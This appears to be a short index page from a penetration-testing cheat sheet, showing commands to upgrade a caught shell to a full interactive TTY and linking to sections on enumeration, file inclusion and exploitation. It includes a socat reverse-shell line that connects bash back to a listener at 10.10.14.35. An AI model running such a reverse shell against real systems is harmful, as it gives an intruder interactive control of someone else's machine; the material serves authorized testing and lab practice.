# [Upgrading TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- With Python:
```bash
	python -c 'import pty; pty.spawn("/bin/bash")'
	ctrl+z
	echo $TERM && tput lines && tput cols
	stty raw -echo
	fg
	export SHELL=bash
	export TERM=xterm-256color
	stty rows 24 columns 121
```
- With Socat:
```bash
	socat file:`tty`,raw,echo=0 tcp-listen:4445
	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.35:4445
```

# [General](https://github.com/PinkDraconian/InfoSecCheatSheets/blob/master/linux/general.md)
# [Enumeration](https://github.com/PinkDraconian/InfoSecCheatSheets/blob/master/linux/enumeration.md)
# [Local File Inclusion](https://github.com/PinkDraconian/InfoSecCheatSheets/blob/master/linux/local%20file%20inclusion.md)
# [Networking](https://github.com/PinkDraconian/InfoSecCheatSheets/blob/master/linux/networking.md)
# [Characters not allowed](https://github.com/PinkDraconian/InfoSecCheatSheets/blob/master/linux/characters%20not%20allowed.md)
# [Exploitation](https://github.com/PinkDraconian/InfoSecCheatSheets/blob/master/linux/exploitation.md)
